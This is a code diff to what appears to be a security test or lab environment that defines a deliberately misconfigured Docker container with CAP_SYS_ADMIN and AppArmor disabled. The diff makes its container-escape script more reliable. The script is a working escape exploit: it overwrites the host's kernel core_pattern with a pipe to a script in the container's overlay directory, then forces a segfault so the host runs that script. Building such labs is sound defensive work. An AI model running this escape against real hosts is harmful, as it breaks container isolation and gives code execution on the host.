@@ -92,7 +92,9 @@ SYS_ADMIN = Weakness(
     difficulty=2,
     runtime="docker",
     description="job container granted CAP_SYS_ADMIN (core_pattern host code execution)",
-    image_packages="python3 python3-pip git curl ca-certificates gcc",
+    # libc6-dev is required or gcc installs but cannot link ("cannot find Scrt1.o"),
+    # which would leave a build container with a compiler that mysteriously doesn't work.
+    image_packages="python3 python3-pip git curl ca-certificates gcc libc6-dev",
     docker_flags="--cap-add=SYS_ADMIN --security-opt apparmor=unconfined",
     # Verbose on purpose: this escape has several failure points that are invisible if
     # stderr is suppressed (missing gcc, /proc/sys still read-only, no upperdir).
@@ -116,11 +118,12 @@ SYS_ADMIN = Weakness(
         'echo "PROCSYS=$PROCSYS"\n'
         'echo "|$UPPER/tmp/onhost.sh" > $PROCSYS/kernel/core_pattern || echo COREPATTERN_WRITE_FAILED\n'
         'echo "core_pattern now: $(cat $PROCSYS/kernel/core_pattern 2>/dev/null)"\n'
+        # trigger a core dump; fall back to python if the compiler is missing OR cannot link
         "printf 'int main(){int*p=0;*p=1;return 0;}' > /tmp/crash.c\n"
-        "if command -v gcc >/dev/null 2>&1; then\n"
-        "  gcc -o /tmp/crash /tmp/crash.c && (ulimit -c unlimited; /tmp/crash) 2>/dev/null || true\n"
+        "if command -v gcc >/dev/null 2>&1 && gcc -o /tmp/crash /tmp/crash.c 2>/tmp/gcc.err; then\n"
+        "  (ulimit -c unlimited; /tmp/crash) 2>/dev/null || true\n"
         "else\n"
-        "  echo 'no gcc; segfaulting python instead'\n"
+        "  echo \"gcc unusable ($(head -1 /tmp/gcc.err 2>/dev/null)); segfaulting python instead\"\n"
         "  (ulimit -c unlimited; python3 -c 'import ctypes; ctypes.string_at(0)') 2>/dev/null || true\n"
         "fi\n"
         "sleep 5\n"
